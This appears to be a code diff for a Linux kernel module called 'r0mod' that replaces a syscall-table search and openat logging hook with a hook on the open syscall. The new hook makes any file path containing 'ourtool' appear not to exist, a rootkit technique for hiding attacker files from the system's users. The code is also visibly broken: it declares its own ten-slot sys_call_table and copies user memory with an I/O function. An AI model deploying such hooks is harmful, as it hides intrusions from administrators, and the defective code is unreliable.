@@ -1,80 +1,57 @@
 #include <linux/init.h>
-#include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/err.h>
-#include <linux/scatterlist.h>
-#include <linux/mutex.h>
-#include <linux/syscalls.h>
-#include <linux/moduleparam.h>
-#include <linux/unistd.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <asm/fcntl.h>
+#include <asm/errno.h>
 #include <linux/slab.h>
-#include <asm/uaccess.h>
+#include <linux/types.h>
+#include <linux/dirent.h>
+#include <linux/string.h>
+#include <linux/fs.h>
+
+extern void *sys_call_table[];
+
+void *sys_call_table[10];
 
 #include <r0mod/global.h>
 
-extern void **sys_call_table;
+int (*orig_open)(const char *pathname, int flag, mode_t mode);
 
-void **sys_call_table;
-
-asmlinkage long _hook_sys_openat(unsigned int dfd,
-    const char __user *filename, int flags, umode_t mode)
+int my_open(const char *pathname, int flag, mode_t mode)
 {
-    printk("into openat syscall hook");
-    return real_sys_openat(dfd,filename,flags,mode);
-}
+    char hide[] = "ourtool";
+    char *kernel_pathname;
 
-// find sys_call_table through sys_close address
-static unsigned long **find_sys_call_table(void)
-{
-    unsigned long offset;
-    unsigned long **sct;
-
-    int flag = 0;
-
-    //sys call num maybe different
-    //check in unistd.h
-    //__NR_close will use 64bit version unistd.h by default when build LKM
-    for(offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *))
+    // Convert to kernel space
+    kernel_pathname = (char *)kmalloc(256, GFP_KERNEL);
+    memcpy_fromio(kernel_pathname, pathname, 255);
+    if(strstr(kernel_pathname, (char *)&hide) != NULL)
     {
-        sct = (unsigned long **)offset;
-        if(sct[__NR_close] == (unsigned long *)sys_close)
-        {
-            if(flag == 0)
-            {
-                printk("Found sys_call_table @ %llx", (long long unsigned int)sct);
-                return sct;
-            }
-            else
-            {
-                printk("Found first sys_call_table @ %llx", (long long unsigned int)sct);
-                flag--;
-            }
-        }
+        kfree(kernel_pathname);
+        // Return error code, 'file does not exist'
+        return -ENOENT;
+    }
+    else
+    {
+        kfree(kernel_pathname);
+        // All OK, this is not our tool
+        return orig_open(pathname, flag, mode);
     }
 
-    /*
-     * Given the loop limit, it's somewhat unlikely we'll get here. I don't
-     * even know if we can attempt to fetch such high addresses from memory,
-     * and even if you can, it will take a while!
-     */
-    return NULL;
+    return 0;
 }
-
-
 
 static int __init r0mod_init(void)
 {
     printk("Module starting...");
 
-    sys_call_table = (void*)find_sys_call_table();
-    printk("Found sys_call_table @ %llx", (long long unsigned int)sys_call_table);
-
-    real_sys_openat = (void*)(sys_call_table[__NR_openat]);
-    printk("real_openat addr @ %llx", (long long unsigned int)real_sys_openat);
-    printk("_NR_openat:%d", __NR_openat);
-    printk("hook_openat addr @ %llx", (long long unsigned int)_hook_sys_openat);
-
-    sys_call_table[__NR_openat] = &_hook_sys_openat;
+    printk("old open addr = %p", sys_call_table[__NR_open]);
+    orig_open = sys_call_table[__NR_open];
+    printk("orig_open addr = %p", orig_open);
+    printk("my_open addr = %p", my_open);
+    sys_call_table[__NR_open] = my_open;
+    printk("new open addr = %p", sys_call_table[__NR_open]);
 
     return 0;
 }
@@ -84,9 +61,9 @@ static void __exit r0mod_exit(void)
 {
     printk("Module ending...");
 
-    sys_call_table[__NR_openat] = real_sys_openat;
-
-    return;
+    printk("old open addr = %p", sys_call_table[__NR_open]);
+    sys_call_table[__NR_open] = orig_open;
+    printk("new open addr = %p", sys_call_table[__NR_open]);
 }
 
 MODULE_LICENSE("GPL");
